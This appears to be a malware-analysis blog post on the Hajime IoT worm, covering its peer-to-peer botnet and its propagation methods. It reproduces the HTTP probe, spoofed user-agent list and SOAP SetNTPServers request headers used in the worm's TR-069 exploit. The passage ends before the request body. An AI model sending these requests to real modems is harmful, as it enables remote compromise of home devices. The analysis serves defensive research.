Hajime (meaning ‘beginning’ in Japanese) is an IoT worm that was first mentioned on 16 October 2016 in a public report by RapidityNetworks.
One month later we saw the first samples being uploaded from Spain to VT.
This worm builds a huge P2P botnet (almost 300,000 devices at the time of publishing this blogpost), but its real purpose remains unknown.
Hajime is continuously evolving, adding and removing features over time.
The malware authors are mainly reliant on very low levels of security.
In this blogpost we outline some of the recent ‘improvements’ to Hajime, some techniques that haven’t been made public, and some statistics about infected IoT devices.
First of all, let’s take a look at the changes made to the attack module recently.
Currently, the ATK (attack) module supports three different attack methods which help to propagate the worm on different IoT devices:
TR-069 exploitation;
Telnet default password attack;
Arris cable modem password of the day attack.
Of these three attacks, the TR-069 exploit is a new one, implemented recently by the attackers.
Technical Report 069 is a standard published by the Broadband Forum, which is an industry organization defining standards used to manage broadband networks.
Many ISPs and device manufacturers are members of the Broadband Forum.
TR-069 allows ISPs to manage modems remotely.
TCP port 7547 has been assigned to this protocol, but some devices appear to use port 5555 instead.
The TR-069 NewNTPServer feature can be used to execute arbitrary commands on vulnerable devices.
In order to do so, the exploit starts by connecting to port 7547 and then sends the following HTTP request:
GET / HTTP/1.1
Host: VICTIM_HOST:VICTIM_PORT
User-Agent: RANDOM_USER_AGENT
Content-Type: text/xml
Content-Length: 0
Where RANDOM_USER_AGENT is chosen from the following list:
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7
After some checks, it sends the following request to trigger the vulnerability:
POST /UD/act?1 HTTP/1.1
Host: VICTIM_HOST:VICTIM_PORT
User-Agent: RANDOM_USER_AGENT
Content-Type: text/xml
Content-Length: BODY_LENGTH
SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers
